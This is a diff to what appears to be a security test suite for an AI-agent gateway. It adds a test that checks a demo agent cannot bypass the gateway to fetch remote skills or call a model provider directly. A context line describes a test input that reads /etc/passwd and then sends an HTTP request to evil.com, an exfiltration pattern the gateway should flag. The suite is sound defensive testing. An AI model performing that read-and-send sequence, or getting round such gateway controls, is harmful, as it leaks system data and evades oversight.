@@ -443,6 +443,55 @@ def test_session_exfiltration(url: str) -> bool:
         client.close()
 
 
+def test_gateway_bypass_prevention(url: str) -> bool:
+    """Gateway-only path: bypass attempts to remote skills/models must fail."""
+    client = new_client(url)
+    try:
+        # Check A: remote skill download must be denied by gateway policy/registry.
+        try:
+            client.call("download_remote_skill", url="https://example.com/skills/remote-skill.yaml")
+            return print_proof(False, "remote skill download unexpectedly succeeded -- expected registry/policy denial")
+        except GatewayError as e:
+            print_gateway_error(e)
+            if e.http_status not in (400, 403):
+                return print_proof(False, f"remote skill denial had unexpected HTTP status: {e.http_status}")
+
+        # Check B (compose-only strict): direct provider egress must be blocked.
+        if os.getenv("DEMO_STRICT_DEEPSCAN") == "1":
+            try:
+                resp = httpx.get("https://api.groq.com/openai/v1/chat/completions", timeout=3.0)
+                return print_proof(
+                    False,
+                    f"direct external model endpoint was reachable (HTTP {resp.status_code}) -- bypass possible",
+                )
+            except Exception as e:
+                print(f"  {DIM}Direct Egress:{RESET} blocked as expected ({type(e).__name__}: {e})")
+        else:
+            print(f"  {DIM}Direct Egress:{RESET} SKIP (strict compose-only assertion)")
+
+        # Check C: model egress should only happen through gateway route.
+        try:
+            client.call_model_chat(
+                model="llama-3.3-70b-versatile",
+                messages=[{"role": "user", "content": "security gateway path verification"}],
+                provider="groq",
+            )
+            return print_proof(True, "model egress reachable only through gateway route (call_model_chat succeeded)")
+        except GatewayError as e:
+            print_gateway_error(e)
+            if e.http_status in (400, 401, 403, 429, 502, 503):
+                return print_proof(
+                    True,
+                    f"model egress path is gateway-mediated and policy-controlled (HTTP {e.http_status})",
+                )
+            return print_proof(False, f"unexpected gateway status from model egress route: {e.http_status}")
+    except Exception as e:
+        print(f"  Error: {e}")
+        return print_proof(False, f"unexpected error: {type(e).__name__}")
+    finally:
+        client.close()
+
+
 def test_spike_token_reference(url: str) -> bool:
     """18. SPIKE token reference: safe $SPIKE{ref:deadbeef} passes DLP, reaches token substitution.
 
@@ -901,6 +950,13 @@ def main() -> None:
             send="read(/etc/passwd) then http_request(https://evil.com) in same session",
             expect="Gateway processes both calls; session tracker flags the read->HTTP exfiltration pattern",
             fn=test_session_exfiltration,
+        ),
+        TestCase(
+            name="Gateway-only path (no direct bypass to remote skills/models)",
+            what="Demo agent cannot bypass gateway controls to download remote skills or call external model endpoints directly",
+            send="download_remote_skill(url=...) via SDK + direct HTTPS to model provider from demo container + call_model_chat via gateway route",
+            expect="Remote skill download denied by gateway, direct model egress blocked in compose mode, and model calls only succeed/deny through gateway controls",
+            fn=test_gateway_bypass_prevention,
         ),
         TestCase(
             name="Rate limit burst (429 on rapid calls)",
